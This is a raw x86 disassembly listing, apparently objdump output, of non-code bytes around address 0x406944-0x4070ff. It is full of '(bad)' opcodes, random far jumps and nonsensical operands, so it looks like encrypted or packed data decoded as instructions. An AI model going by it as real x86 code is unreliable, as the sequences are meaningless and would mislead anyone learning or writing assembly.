  406944:	bound  ecx,QWORD PTR [edx]
  406946:	jl     0x40694d
  406948:	pop    ss
  406949:	and    BYTE PTR [eax],ch
  40694b:	call   0xd58:0xe6c88fd5
  406952:	fs ret 
  406954:	repnz mov ebp,0x96ee6c87
  40695a:	cmp    bl,BYTE PTR [edi]
  40695c:	bound  ebp,QWORD PTR [esi]
  40695e:	xlat   BYTE PTR ds:[ebx]
  40695f:	dec    edi
  406960:	nop
  406961:	cmp    DWORD PTR [ebx-0xf],0x39
  406965:	cmp    ch,BYTE PTR [ecx-0x38467705]
  40696b:	adc    DWORD PTR [edx],edx
  40696d:	outs   dx,BYTE PTR ds:[esi]
  40696e:	out    0x56,al
  406970:	pop    edi
  406971:	call   DWORD PTR [edx+esi*8-0x50]
  406975:	jp     0x40699d
  406977:	(bad)  
  406978:	or     bl,cl
  40697a:	jns    0x40698b
  40697c:	cmp    DWORD PTR [edx],esp
  40697e:	push   eax
  40697f:	int    0x7b
  406981:	and    al,BYTE PTR [edx-0x60474061]
  406987:	mov    al,0x80
  406989:	adc    bl,BYTE PTR [ebp+0x6b48640a]
  40698f:	xchg   WORD PTR [ebx+0x78ac0049],di
  406996:	cwde   
  406997:	and    ebx,DWORD PTR [esi]
  406999:	imul   esp,DWORD PTR [edx],0x98037d3
  40699f:	jae    0x406a01
  4069a1:	ja     0x406962
  4069a3:	pop    esi
  4069a4:	jmp    0x4069a0
  4069a6:	and    ah,0xb4
  4069a9:	and    eax,0xbf145cee
  4069ae:	jle    0x406978
  4069b0:	(bad)  
  4069b1:	cmp    edx,DWORD PTR [edx+0x62]
  4069b4:	lds    eax,FWORD PTR [ebx]
  4069b6:	shl    DWORD PTR ds:0xe104fe13,cl
  4069bc:	mov    ebp,0x35ae15d1
  4069c1:	sbb    eax,0xe99fc51a
  4069c6:	sbb    DWORD PTR [esi+esi*1+0x752a6eae],ebp
  4069cd:	or     ch,BYTE PTR [ebx-0xd]
  4069d0:	xchg   edi,eax
  4069d1:	ficom  DWORD PTR [edi+0x36d2bd59]
  4069d7:	mov    edx,0x2f1453ea
  4069dc:	outs   dx,DWORD PTR ds:[esi]
  4069dd:	or     bh,dh
  4069df:	mov    ah,0x34
  4069e1:	enter  0x16bc,0xe2
  4069e5:	push   esp
  4069e6:	adc    dh,BYTE PTR es:0xe2cc5984
  4069ed:	rcl    dl,0xea
  4069f0:	and    al,0xee
  4069f2:	mov    bh,0xa1
  4069f4:	pop    ecx
  4069f5:	and    BYTE PTR [ebp+0x73],cl
  4069f8:	sub    ebx,DWORD PTR [ecx+ecx*2-0x34495190]
  4069ff:	adc    ax,0xca04
  406a03:	jmp    0x406a79
  406a05:	stos   BYTE PTR es:[edi],al
  406a06:	pop    ecx
  406a07:	cld    
  406a08:	mov    ds,WORD PTR [ebx+0x66867640]
  406a0e:	adc    DWORD PTR [edi+0x46e03b67],edx
  406a14:	push   ebx
  406a16:	out    dx,al
  406a17:	push   esp
  406a18:	stos   DWORD PTR es:[edi],eax
  406a19:	jo     0x4069a4
  406a1b:	outs   dx,DWORD PTR ds:[esi]
  406a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1d:	cwde   
  406a1e:	in     eax,dx
  406a1f:	mov    ?,WORD PTR [edi-0x511d15b5]
  406a25:	test   al,0x1e
  406a27:	test   al,0x57
  406a29:	ja     0x4069ed
  406a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a2c:	lods   eax,DWORD PTR ds:[esi]
  406a2d:	inc    esi
  406a2e:	mov    ebp,0xe172b89d
  406a33:	aaa    
  406a34:	or     al,0x83
  406a36:	in     eax,0x8c
  406a38:	jno    0x406a77
  406a3a:	jecxz  0x406a6f
  406a3c:	fwait
  406a3d:	daa    
  406a3e:	out    0x5,eax
  406a40:	pushf  
  406a41:	pusha  
  406a42:	or     cl,cl
  406a44:	addr16 dec esi
  406a46:	xchg   ecx,eax
  406a47:	xlat   BYTE PTR ds:[ebx]
  406a48:	xor    BYTE PTR [eax-0x7209702],ah
  406a4e:	fstp   DWORD PTR [ecx+0x6671becb]
  406a54:	sbb    eax,0x9ff29599
  406a59:	adc    ebx,eax
  406a5b:	test   eax,0xf72d1ea6
  406a60:	cdq    
  406a61:	pop    edx
  406a62:	dec    esi
  406a63:	retf   0x34c7
  406a66:	nop
  406a67:	in     eax,dx
  406a68:	jmp    0x89852003
  406a6d:	cmp    eax,0x4c52dae0
  406a72:	pop    esp
  406a73:	inc    ebp
  406a74:	daa    
  406a75:	adc    esi,DWORD PTR [ecx-0x45]
  406a78:	add    ecx,ebx
  406a7a:	inc    edi
  406a7b:	shl    ebx,cl
  406a7d:	iret   
  406a7e:	cmp    eax,0x8fbb28f5
  406a83:	retf   
  406a84:	in     al,0xf6
  406a86:	and    BYTE PTR [esi+0x29911e47],bh
  406a8c:	loopne 0x406a50
  406a8e:	or     ebx,DWORD PTR [edx+0x56]
  406a91:	pusha  
  406a92:	out    0x25,eax
  406a94:	(bad)  
  406a95:	jb     0x406ad3
  406a97:	push   0x5ab0c7d
  406a9c:	inc    ebp
  406a9d:	aaa    
  406a9e:	into   
  406a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aa0:	test   BYTE PTR [ebp-0x1a4fb0ad],bl
  406aa6:	jno    0x406b23
  406aa8:	aam    0xde
  406aaa:	aaa    
  406aab:	daa    
  406aac:	mov    edi,0xa0f1aa4b
  406ab1:	imul   edx,DWORD PTR [esi-0x43028249],0x50dc9e64
  406abb:	pop    ecx
  406abc:	rcr    ch,1
  406abe:	or     dh,BYTE PTR [edi-0x21c5db0d]
  406ac4:	push   ebx
  406ac5:	test   eax,0xd4280602
  406aca:	adc    ecx,DWORD PTR [si-0x2eb5]
  406acf:	retf   
  406ad0:	xchg   ecx,eax
  406ad1:	sub    al,ch
  406ad3:	pop    ebx
  406ad4:	or     ebp,DWORD PTR [edx-0x579b1874]
  406ada:	lock int3 
  406adc:	(bad)  
  406add:	aam    0xa3
  406adf:	daa    
  406ae0:	fsubr  DWORD PTR [edi+0x7a]
  406ae3:	jp     0x406b15
  406ae5:	xchg   ebx,eax
  406ae6:	(bad)  
  406ae7:	fist   WORD PTR [ebx]
  406ae9:	dec    edx
  406aea:	inc    ecx
  406aeb:	arpl   WORD PTR [ebp-0x1fd5d3fe],sp
  406af1:	addr16 (bad) 
  406af3:	div    DWORD PTR [edi+0x66]
  406af6:	push   ebx
  406af7:	fst    st(5)
  406af9:	pop    ebx
  406afa:	fs (bad) 
  406afc:	cmp    eax,0x787c8a1b
  406b01:	sahf   
  406b02:	or     al,0x9a
  406b04:	add    al,0xc5
  406b06:	cmp    dl,BYTE PTR [ebx-0x26]
  406b09:	nop
  406b0a:	or     al,0xea
  406b0c:	and    eax,ecx
  406b0e:	pushf  
  406b0f:	jo     0x406b22
  406b11:	outs   dx,DWORD PTR ds:[esi]
  406b12:	and    DWORD PTR [ecx-0x7631af6d],0x3be809ca
  406b1c:	into   
  406b1d:	push   esp
  406b1e:	mov    dh,0x1b
  406b20:	scas   eax,DWORD PTR es:[edi]
  406b21:	enter  0xee9c,0x7f
  406b25:	outs   dx,BYTE PTR ds:[esi]
  406b26:	rcl    DWORD PTR [edx+0x3c],0xc1
  406b2a:	fcom   DWORD PTR [edi]
  406b2c:	xchg   ebp,eax
  406b2d:	mov    dh,bl
  406b2f:	add    bh,BYTE PTR [ebx]
  406b31:	repnz push ds
  406b33:	test   al,0xb7
  406b35:	push   0x7c
  406b37:	jbe    0x406abf
  406b39:	xchg   DWORD PTR [esi],edi
  406b3b:	ss cmp eax,edx
  406b3e:	mov    eax,0x51a4c55c
  406b43:	cmp    BYTE PTR [edi+eax*4+0x5f],0xb0
  406b48:	sub    ebp,0xfd02e553
  406b4e:	lea    esi,[eax-0x2f]
  406b51:	test   al,0xa3
  406b53:	fnstsw WORD PTR [edi]
  406b55:	mov    bl,dh
  406b57:	pop    eax
  406b58:	xchg   ebx,eax
  406b59:	shl    BYTE PTR [ecx-0x4c2d38e6],1
  406b5f:	push   ecx
  406b60:	sub    ecx,esp
  406b62:	mov    ecx,0x3795a0a7
  406b67:	std    
  406b68:	and    eax,0x280ff22d
  406b6d:	mov    ecx,0x6b538641
  406b72:	jbe    0x406b4f
  406b74:	es push cs
  406b76:	in     al,0xc7
  406b78:	xor    al,0x6e
  406b7a:	dec    eax
  406b7b:	sub    al,0x6e
  406b7d:	or     al,0x52
  406b7f:	lds    edx,FWORD PTR [edi]
  406b81:	mov    esp,0xaca4c1d8
  406b86:	mov    eax,0x4df8c330
  406b8b:	test   eax,0xa34d234b
  406b90:	jno    0x406b4a
  406b92:	xchg   edx,eax
  406b93:	jbe    0x406bac
  406b95:	xchg   esp,eax
  406b96:	int    0x73
  406b98:	and    eax,0xd3e71cb6
  406b9d:	popf   
  406b9e:	jbe    0x406bb5
  406ba0:	sbb    al,0xa6
  406ba2:	stos   DWORD PTR es:[edi],eax
  406ba3:	shr    BYTE PTR [edi],cl
  406ba5:	and    BYTE PTR [eax-0x4e],al
  406ba8:	shl    DWORD PTR [ebp+0x399b8adf],0x79
  406baf:	out    dx,al
  406bb0:	cld    
  406bb1:	lods   al,BYTE PTR ds:[esi]
  406bb2:	pop    ds
  406bb3:	push   ebp
  406bb4:	test   al,al
  406bb6:	xchg   ebp,ebx
  406bb8:	mov    cl,0xb0
  406bba:	enter  0xb629,0xd9
  406bbe:	mov    ds:0x95b610e4,eax
  406bc3:	fsubr  st(0),st
  406bc5:	(bad)  
  406bc6:	fisub  DWORD PTR [ebp+0x701d481e]
  406bcc:	pop    esp
  406bcd:	stc    
  406bce:	xchg   esi,eax
  406bcf:	cmp    al,0xe7
  406bd1:	jge    0x406b55
  406bd3:	sbb    bh,BYTE PTR [bx+si]
  406bd6:	lods   al,BYTE PTR ds:[esi]
  406bd7:	jo     0x406bef
  406bd9:	fnstsw WORD PTR [ebp-0x58]
  406bdc:	pop    ss
  406bdd:	fwait
  406bde:	adc    BYTE PTR [edx],bl
  406be0:	or     al,0x11
  406be2:	hlt    
  406be3:	jb     0x406b6b
  406be5:	mov    BYTE PTR [edx-0x77],bh
  406be8:	jae    0x406b86
  406bea:	xchg   edx,eax
  406beb:	ret    
  406bec:	rcr    BYTE PTR [edx+edx*8-0x3b],cl
  406bf0:	popa   
  406bf1:	test   edx,ecx
  406bf3:	or     al,0xa4
  406bf5:	ins    DWORD PTR es:[edi],dx
  406bf6:	fsub   QWORD PTR [ebx+0x225cd1de]
  406bfc:	retf   
  406bfd:	xchg   bh,bh
  406bff:	cmp    DWORD PTR [ecx-0x3477ffbb],esi
  406c05:	pusha  
  406c06:	js     0x406bb2
  406c08:	mov    cl,0xba
  406c0a:	push   ss
  406c0b:	stos   BYTE PTR es:[edi],al
  406c0c:	sub    bh,ah
  406c0e:	xchg   edx,eax
  406c0f:	add    ebp,DWORD PTR ds:0x1570114a
  406c15:	pop    es
  406c16:	jmp    0x406bd9
  406c18:	mov    bh,dh
  406c1a:	inc    ebx
  406c1b:	repz push 0x48
  406c1e:	outs   dx,BYTE PTR ds:[esi]
  406c1f:	mov    dh,0x59
  406c21:	mov    ds:0x6c39ffe0,eax
  406c26:	mov    ecx,0x71a413ef
  406c2b:	cmp    BYTE PTR [ebx+0x57e5d3de],0xa
  406c32:	pop    ds
  406c33:	dec    ebp
  406c34:	lock scas eax,DWORD PTR es:[edi]
  406c36:	jg     0x406c1b
  406c38:	ja     0x406c1d
  406c3a:	(bad)  
  406c3b:	cli    
  406c3c:	(bad)  
  406c3d:	fcos   
  406c3f:	add    al,0x2c
  406c41:	in     al,0xa4
  406c43:	and    DWORD PTR [ecx+0x4d],ecx
  406c46:	aaa    
  406c47:	or     al,0x91
  406c49:	xor    DWORD PTR [ecx-0x3],edx
  406c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4d:	and    al,0xd8
  406c4f:	test   eax,0x31cbaf86
  406c54:	sahf   
  406c55:	pop    edx
  406c56:	mov    ah,0xc5
  406c58:	push   ebx
  406c59:	addr16 fcmovu st,st(5)
  406c5c:	test   al,0x13
  406c5e:	pop    ecx
  406c5f:	div    BYTE PTR [edx]
  406c61:	jnp    0x406c1d
  406c63:	sbb    esi,DWORD PTR [eax]
  406c65:	inc    esp
  406c66:	das    
  406c67:	fld    st(5)
  406c69:	ret    0x544b
  406c6c:	fsubr  st(6),st
  406c6e:	push   0x1a
  406c70:	or     ebp,DWORD PTR [edx-0x46c14dc3]
  406c76:	jo     0x406c77
  406c78:	(bad)  
  406c7a:	loopne 0x406ca4
  406c7c:	adc    eax,0x559e14ae
  406c81:	les    ebx,FWORD PTR [esi+0x51d4d560]
  406c87:	mov    ebp,DWORD PTR [esi+0x2c]
  406c8a:	cs mov eax,0xa6cd1e5e
  406c90:	pop    esi
  406c91:	jmp    0xf8d14331
  406c96:	js     0x406c23
  406c98:	mov    al,0x9a
  406c9a:	cwde   
  406c9b:	std    
  406c9c:	fstp   QWORD PTR [eax]
  406c9e:	push   esi
  406c9f:	xlat   BYTE PTR ds:[ebx]
  406ca0:	pop    ds
  406ca1:	adc    ecx,DWORD PTR [ecx+eiz*2]
  406ca4:	push   eax
  406ca5:	sahf   
  406ca6:	aam    0x2b
  406ca8:	xor    dl,bh
  406caa:	xor    dh,BYTE PTR [edx]
  406cac:	xchg   esi,eax
  406cad:	xchg   esi,eax
  406cae:	mov    eax,ds:0x4e207488
  406cb3:	dec    DWORD PTR [esi]
  406cb5:	mov    ss,WORD PTR [ecx-0x3df82d53]
  406cbb:	mov    edi,0x4da40fbd
  406cc0:	out    0x66,eax
  406cc2:	js     0x406c97
  406cc4:	clc    
  406cc5:	mov    ebx,0x11a705e5
  406cca:	push   esi
  406ccb:	and    al,0x54
  406ccd:	in     eax,0x57
  406ccf:	mov    ebx,0x71f8fd9
  406cd4:	mov    dl,al
  406cd6:	lahf   
  406cd7:	aad    0xb9
  406cd9:	push   es
  406cda:	out    0x37,al
  406cdc:	out    0x36,al
  406cde:	rcl    BYTE PTR [edi-0x65c3f898],cl
  406ce4:	out    0xcf,al
  406ce6:	xor    DWORD PTR [ebx],0xe9c57505
  406cec:	out    dx,al
  406ced:	inc    edx
  406cee:	retf   0xb43a
  406cf1:	loop   0x406d33
  406cf3:	dec    eax
  406cf4:	push   0x23
  406cf6:	dec    ecx
  406cf7:	push   es
  406cf8:	stos   BYTE PTR es:[di],al
  406cfa:	inc    eax
  406cfb:	clc    
  406cfc:	xor    eax,0x216d043d
  406d01:	lock xor eax,0x119c2e01
  406d07:	jnp    0x406c93
  406d09:	sub    BYTE PTR [esi-0x26b554fa],dl
  406d0f:	js     0x406d14
  406d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d12:	cmp    al,0xd9
  406d14:	icebp  
  406d15:	retf   
  406d16:	lock pop eax
  406d18:	(bad)  
  406d19:	test   DWORD PTR [esi+0xbea06c1],0x36f27a06
  406d23:	cwde   
  406d24:	dec    edi
  406d25:	push   es
  406d26:	sti    
  406d27:	retf   0xc299
  406d2a:	ins    BYTE PTR es:[edi],dx
  406d2b:	push   cs
  406d2c:	scas   eax,DWORD PTR es:[edi]
  406d2d:	mov    ah,0xdf
  406d2f:	jnp    0x406d1d
  406d31:	jmp    0x67b8:0x3df5e328
  406d38:	test   BYTE PTR [edi],dl
  406d3a:	jbe    0x406ccb
  406d3c:	cmp    al,0xa0
  406d3e:	push   0x1f16137e
  406d43:	into   
  406d44:	ss mov bl,0xef
  406d47:	or     al,0x6
  406d49:	aam    0xc2
  406d4b:	push   esi
  406d4c:	xchg   edx,eax
  406d4d:	scas   al,BYTE PTR es:[edi]
  406d4e:	mov    ch,0xca
  406d50:	shr    DWORD PTR [eax+0x67cb8da2],0xcd
  406d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d58:	mov    ah,0x58
  406d5a:	jne    0x406d24
  406d5c:	xor    eax,esi
  406d5e:	pop    edx
  406d5f:	sub    edi,DWORD PTR [edx+0x377296e7]
  406d65:	sahf   
  406d66:	out    0xf9,eax
  406d68:	sub    esp,DWORD PTR [eax+0xc]
  406d6b:	mov    esi,0x7d51f9ce
  406d70:	xchg   edx,eax
  406d71:	js     0x406d42
  406d73:	mov    bl,0x99
  406d75:	das    
  406d76:	push   esi
  406d77:	fstp   QWORD PTR [esi+0x8]
  406d7a:	sahf   
  406d7b:	mov    ?,WORD PTR [edi]
  406d7d:	or     ebp,DWORD PTR [ebx]
  406d7f:	sti    
  406d80:	cwde   
  406d81:	nop
  406d82:	int    0x8b
  406d84:	leave  
  406d85:	or     BYTE PTR [ebx-0x6a],al
  406d88:	sub    DWORD PTR [esi+edx*4+0x6c54c9a8],ecx
  406d8f:	sbb    DWORD PTR [ecx+0x79],esp
  406d92:	mov    ch,0x77
  406d94:	out    dx,al
  406d95:	xchg   edx,eax
  406d96:	xchg   esi,eax
  406d97:	add    esp,esi
  406d99:	(bad)  
  406d9a:	fs jge 0x406d5e
  406d9d:	add    DWORD PTR [ecx+0x112fefe0],0xffffffee
  406da4:	cmp    edx,DWORD PTR [esp+ebx*2]
  406da7:	retf   
  406da8:	sub    al,0xe6
  406daa:	addr16 dec esp
  406dac:	sbb    eax,0x67b63532
  406db1:	and    BYTE PTR [ebx-0x79],ah
  406db4:	push   0xffffff8f
  406db6:	retf   0x1707
  406db9:	adc    al,0xa7
  406dbb:	dec    ecx
  406dbc:	push   0xdde15aeb
  406dc1:	fs dec edi
  406dc3:	jmp    0x7515:0xc53be24c
  406dca:	dec    edi
  406dcb:	cmp    DWORD PTR [edi+ecx*4+0x77],eax
  406dcf:	jge    0x406dcc
  406dd1:	pop    esi
  406dd2:	daa    
  406dd3:	add    al,0x51
  406dd5:	jmp    0x268d:0x831c6e1
  406ddc:	out    dx,eax
  406ddd:	imul   ecx,DWORD PTR [ebx+0x5e],0xbe3d18ab
  406de4:	loop   0x406e1c
  406de6:	addr16 out 0x34,eax
  406de9:	push   eax
  406dea:	mov    WORD PTR [esi],?
  406dec:	jno    0x406e45
  406dee:	ins    DWORD PTR es:[edi],dx
  406def:	push   ds
  406df0:	(bad)  
  406df1:	fs adc eax,0x59e9d52d
  406df7:	cmp    al,0x70
  406df9:	mov    eax,ecx
  406dfb:	stos   DWORD PTR es:[edi],eax
  406dfc:	push   0x3b
  406dfe:	data16 loope 0x406dc1
  406e01:	cmp    BYTE PTR [bp+si+0x3c14],cl
  406e06:	or     eax,0xc86a5c22
  406e0b:	push   eax
  406e0c:	rcr    DWORD PTR [edx+ebp*2+0x8],0xce
  406e11:	mov    bh,0x1
  406e13:	xchg   edx,eax
  406e14:	adc    dl,BYTE PTR [edx+0x64]
  406e17:	test   dl,0xeb
  406e1a:	and    eax,0x95d3edc5
  406e1f:	sub    BYTE PTR [ecx-0x23],0x83
  406e23:	lods   al,BYTE PTR ds:[esi]
  406e24:	and    al,0xc0
  406e26:	mov    al,0x47
  406e28:	mov    edi,0xf9f0e189
  406e2d:	das    
  406e2e:	adc    DWORD PTR [esi+0x78],esp
  406e31:	push   edx
  406e32:	add    ah,cl
  406e34:	call   0x6023ac83
  406e39:	push   eax
  406e3a:	out    0xbd,al
  406e3c:	mov    edx,0x25d7fb6c
  406e41:	ja     0x406e86
  406e43:	jae    0x406e92
  406e45:	call   0x6fe:0xa18ccd13
  406e4c:	pushf  
  406e4d:	or     al,0xdf
  406e4f:	jne    0x406ecf
  406e51:	push   cs
  406e52:	loopne 0x406e08
  406e54:	sub    DWORD PTR [ebp+esi*1-0x7fba6ffd],esi
  406e5b:	aas    
  406e5c:	add    dh,0x8b
  406e5f:	sbb    ebx,DWORD PTR ds:0xcb947b61
  406e65:	retf   0xe64f
  406e68:	xchg   edx,eax
  406e69:	test   DWORD PTR [ecx+ebx*4],edx
  406e6c:	inc    eax
  406e6d:	loopne 0x406e29
  406e6f:	jmp    0xdc80ee10
  406e74:	repz adc BYTE PTR ds:0x6063f735,0x88
  406e7c:	inc    ebp
  406e7d:	sbb    BYTE PTR [ebx],ah
  406e7f:	fwait
  406e80:	dec    ebp
  406e81:	sti    
  406e82:	test   DWORD PTR [edx-0x56753eae],ecx
  406e88:	mov    edx,0xe562c2f6
  406e8d:	ja     0x406ec6
  406e8f:	pusha  
  406e90:	mov    dl,0x53
  406e92:	dec    esi
  406e93:	jbe    0x406eaf
  406e95:	push   ebx
  406e96:	pop    eax
  406e97:	iret   
  406e98:	pop    ss
  406e99:	mov    ds:0x4a913bc7,al
  406e9e:	xlat   BYTE PTR ds:[ebx]
  406e9f:	and    ah,BYTE PTR [eax-0x429217c1]
  406ea5:	arpl   WORD PTR [esi],di
  406ea7:	pop    eax
  406ea8:	mov    WORD PTR [edx-0x53ba000b],ds
  406eae:	test   al,0x70
  406eb0:	pop    ebp
  406eb1:	sbb    DWORD PTR [esi],ecx
  406eb3:	dec    ecx
  406eb4:	mov    ecx,ebp
  406eb6:	lods   eax,DWORD PTR ds:[esi]
  406eb7:	sbb    DWORD PTR [edx+0x1ec49783],0x49
  406ebe:	mov    bl,0x59
  406ec0:	(bad)  [ecx-0x138dbe53]
  406ec6:	xor    BYTE PTR [edi+0x548013f5],cl
  406ecc:	or     DWORD PTR [edi+ecx*2+0x4d],ecx
  406ed0:	lods   eax,DWORD PTR ds:[esi]
  406ed1:	int3   
  406ed2:	lods   al,BYTE PTR ds:[esi]
  406ed3:	jbe    0x406e95
  406ed5:	xchg   DWORD PTR [edi+0x6fd4f35b],edi
  406edb:	add    DWORD PTR [edx-0x44],eax
  406ede:	aad    0x50
  406ee0:	push   es
  406ee1:	dec    ebx
  406ee2:	xchg   edx,eax
  406ee3:	(bad)  
  406ee4:	xor    dl,BYTE PTR [ecx]
  406ee6:	pop    eax
  406ee7:	outs   dx,BYTE PTR ds:[esi]
  406ee8:	shl    bh,1
  406eea:	xlat   BYTE PTR ds:[ebx]
  406eeb:	mov    gs,WORD PTR [edi-0x391fc30e]
  406ef1:	pop    ebx
  406ef2:	inc    edi
  406ef3:	into   
  406ef4:	xor    ebx,DWORD PTR [edx+ebx*1-0x41f59171]
  406efb:	out    0x7f,eax
  406efd:	fisubr DWORD PTR [edx-0x730c109]
  406f03:	scas   eax,DWORD PTR es:[edi]
  406f04:	lahf   
  406f05:	mov    ds:0x51dd626,eax
  406f0a:	lods   al,BYTE PTR ds:[esi]
  406f0b:	adc    cl,BYTE PTR [ebx-0x21b3417f]
  406f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f12:	jae    0x406f7c
  406f14:	adc    ebx,DWORD PTR [ebp-0x5b]
  406f17:	loopne 0x406eb7
  406f19:	cwde   
  406f1a:	inc    eax
  406f1b:	outs   dx,DWORD PTR ds:[esi]
  406f1c:	jp     0x406eb3
  406f1e:	add    al,0x5f
  406f20:	add    BYTE PTR [edi-0xd1ac0c5],dh
  406f26:	shr    DWORD PTR [edx],1
  406f28:	and    DWORD PTR [eax+0x36],edi
  406f2b:	xchg   DWORD PTR [edi],esi
  406f2d:	dec    ebx
  406f2e:	fsub   DWORD PTR [ecx]
  406f30:	es jae 0x406eec
  406f33:	mov    ecx,0xefd1d5cf
  406f38:	mul    DWORD PTR [ebp-0x78c316d1]
  406f3e:	push   0x56bac043
  406f43:	rol    DWORD PTR [ebp+eax*4+0x33],0xda
  406f48:	push   esp
  406f49:	push   edi
  406f4a:	mov    ds:0x2b3fd02b,al
  406f4f:	out    0x14,al
  406f51:	ret    0xd5c4
  406f54:	mov    WORD PTR [ebp+ecx*8-0x9c2285e],ss
  406f5b:	sbb    BYTE PTR [ebp+edi*8+0x2e],0x1d
  406f60:	xchg   esp,eax
  406f61:	std    
  406f62:	repnz sub al,bh
  406f65:	adc    DWORD PTR ds:0x1b826683,eax
  406f6b:	mov    al,0xcc
  406f6d:	mov    ebp,0xd76ef796
  406f72:	and    esp,0xfffffff6
  406f75:	xor    eax,0x66142f98
  406f7a:	pusha  
  406f7b:	ins    DWORD PTR es:[edi],dx
  406f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f7d:	rol    esp,1
  406f7f:	xchg   edx,eax
  406f80:	loope  0x406f90
  406f82:	mov    ds:0xaa101259,al
  406f87:	mov    ah,0xe0
  406f89:	jmp    0x1234dac6
  406f8e:	dec    ecx
  406f8f:	dec    edi
  406f90:	add    al,0xb2
  406f92:	div    DWORD PTR [edi]
  406f94:	jl     0x406fc3
  406f96:	xchg   ebx,eax
  406f97:	xor    BYTE PTR [esi+0x3c],ch
  406f9a:	sub    al,0xd3
  406f9c:	or     eax,0x55e4010
  406fa1:	xlat   BYTE PTR ds:[ebx]
  406fa2:	inc    edx
  406fa3:	xchg   esp,eax
  406fa4:	shr    BYTE PTR [edx+0x4cd53b83],cl
  406faa:	mov    ebp,0xefbc988e
  406faf:	mov    dh,BYTE PTR [edx+0x4d58abd4]
  406fb5:	xchg   edi,eax
  406fb6:	mov    fs,WORD PTR [ebp-0x34860283]
  406fbc:	loop   0x406fa6
  406fbe:	test   al,0xbb
  406fc0:	fmul   st(4),st
  406fc2:	sbb    esi,DWORD PTR [ecx-0x1e]
  406fc5:	mov    ecx,0x4cd767da
  406fca:	call   0x3d3fedef
  406fcf:	repnz xlat BYTE PTR ds:[ebx]
  406fd1:	fwait
  406fd2:	push   esi
  406fd3:	mov    eax,ds:0xd644d876
  406fd8:	sub    WORD PTR [ecx+0x63],cx
  406fdc:	sbb    al,0x8d
  406fde:	in     al,dx
  406fdf:	sbb    edx,esi
  406fe1:	sbb    bl,bh
  406fe3:	mov    ah,0x90
  406fe5:	rol    BYTE PTR [eax+ebp*4-0x279a4ccb],cl
  406fec:	sbb    BYTE PTR cs:[ebx+0x4f],0x5a
  406ff1:	les    edi,FWORD PTR [eax]
  406ff3:	push   ss
  406ff4:	xor    ebp,esi
  406ff6:	je     0x406fe0
  406ff8:	outs   dx,BYTE PTR ds:[esi]
  406ff9:	inc    edx
  406ffa:	jae    0x406f8b
  406ffc:	call   0xfb00:0x1dce6c33
  407003:	mov    esi,0x2f21b79a
  407008:	das    
  407009:	ret    0xa911
  40700c:	jno    0x406f91
  40700e:	pusha  
  40700f:	sbb    al,0xa1
  407011:	sahf   
  407012:	xor    edi,DWORD PTR [ecx]
  407014:	or     eax,0xeab4bf81
  407019:	pop    ss
  40701a:	adc    ch,dl
  40701c:	das    
  40701d:	ins    DWORD PTR es:[edi],dx
  40701e:	sub    ebx,esi
  407020:	and    DWORD PTR [edi+0x29],ebp
  407023:	clc    
  407024:	mov    ds:0x6749f859,al
  407029:	mov    esi,0x966fd50b
  40702e:	out    dx,al
  40702f:	test   bh,al
  407031:	and    ebp,ecx
  407033:	mov    ss,WORD PTR [eax-0x27]
  407036:	test   DWORD PTR [ebx],esi
  407038:	int    0x55
  40703a:	xchg   esp,eax
  40703b:	pop    ecx
  40703c:	(bad)  
  40703d:	(bad)  
  40703e:	xchg   DWORD PTR [ecx+0x32bdfee6],edi
  407044:	adc    bh,ch
  407046:	(bad)  
  407047:	fcomp  QWORD PTR ds:0xd5d93157
  40704d:	popa   
  40704e:	mov    fs,WORD PTR [eax]
  407050:	shl    BYTE PTR [edi],0xec
  407053:	sub    DWORD PTR [eax+0x5ad148c7],esi
  407059:	adc    dl,al
  40705b:	(bad)  
  40705c:	cmc    
  40705d:	dec    esp
  40705e:	push   edx
  40705f:	mov    ss,WORD PTR [esp+eax*1]
  407062:	dec    esi
  407063:	cmp    BYTE PTR ds:0x6c9153c6,cl
  407069:	mov    dl,0xd1
  40706b:	test   DWORD PTR [ebp+0x4f],0xa8a4653d
  407072:	(bad)  
  407073:	jae    0x407093
  407075:	pop    ds
  407076:	mov    cl,0x1d
  407078:	ret    0x2787
  40707b:	and    ch,cl
  40707d:	sub    esp,DWORD PTR [esi+0x5df6eb4d]
  407083:	rol    BYTE PTR [ebp-0x6e],1
  407086:	xchg   ebp,eax
  407087:	fwait
  407088:	sub    BYTE PTR [edi-0x4a],dh
  40708b:	pop    edx
  40708c:	or     al,0xd0
  40708e:	add    al,0x23
  407090:	mov    al,ds:0xe7e16a8
  407095:	mov    ebx,DWORD PTR ds:0x531f4f16
  40709b:	loopne 0x4070ec
  40709d:	frstor [esi*2+0x6e60444f]
  4070a4:	jecxz  0x407053
  4070a6:	jmp    0x40710e
  4070a8:	dec    edi
  4070a9:	shr    BYTE PTR [edx+ecx*4+0x11],1
  4070ad:	cmp    bl,al
  4070af:	dec    esp
  4070b0:	dec    ebx
  4070b1:	xor    eax,0xebebef60
  4070b6:	mov    esi,0x5749895f
  4070bb:	mov    ebx,0x6766dec1
  4070c0:	fisubr DWORD PTR [esi+ecx*8+0x2d09ebb3]
  4070c7:	loop   0x4070ce
  4070c9:	xchg   edx,eax
  4070ca:	int3   
  4070cb:	xchg   esi,eax
  4070cc:	aam    0x2a
  4070ce:	or     bh,BYTE PTR [esi-0x73]
  4070d1:	sub    BYTE PTR [edi+0x42],ch
  4070d4:	adc    ch,BYTE PTR [esi+edx*1]
  4070d7:	adc    BYTE PTR [eax],bl
  4070d9:	hlt    
  4070da:	push   es
  4070db:	xchg   DWORD PTR [eax-0x4f90a6b7],edi
  4070e1:	stc    
  4070e2:	or     esp,DWORD PTR [ebp-0x7de96b4b]
  4070e8:	cmp    BYTE PTR [ebp-0x21],dl
  4070eb:	xlat   BYTE PTR ds:[ebx]
  4070ec:	dec    edi
  4070ed:	pop    eax
  4070ee:	sbb    eax,0xb9b14f6d
  4070f3:	inc    ebp
  4070f4:	stc    
  4070f5:	mov    WORD PTR [esi],es
  4070f7:	dec    edx
  4070f8:	sub    BYTE PTR ds:0x8fddf71a,al
  4070fe:	dec    edi
  4070ff:	and    eax,0xb0fae8ba
